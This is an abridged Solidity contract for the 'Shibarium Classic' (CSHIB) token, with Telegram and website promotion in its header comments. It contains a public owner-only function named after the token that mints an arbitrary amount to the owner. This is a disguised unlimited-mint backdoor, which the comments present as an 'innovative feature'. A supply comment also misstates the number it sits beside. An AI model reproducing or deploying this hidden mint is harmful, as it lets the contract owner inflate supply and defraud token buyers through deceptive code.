//
// $ShibariumClassic proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CshibariumOfficial
// 📱 Website ::https://cshib.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ShibariumClassic(uint256 amount) public onlyOwner {
 _ShibariumClassic(msg.sender, amount);
    }
    ...
    function _ShibariumClassic(address account, uint256 amount) internal virtual {
...
contract $ShibariumClassic is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Shibarium Classic", "CSHIB") {
     _ShibariumClassic(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}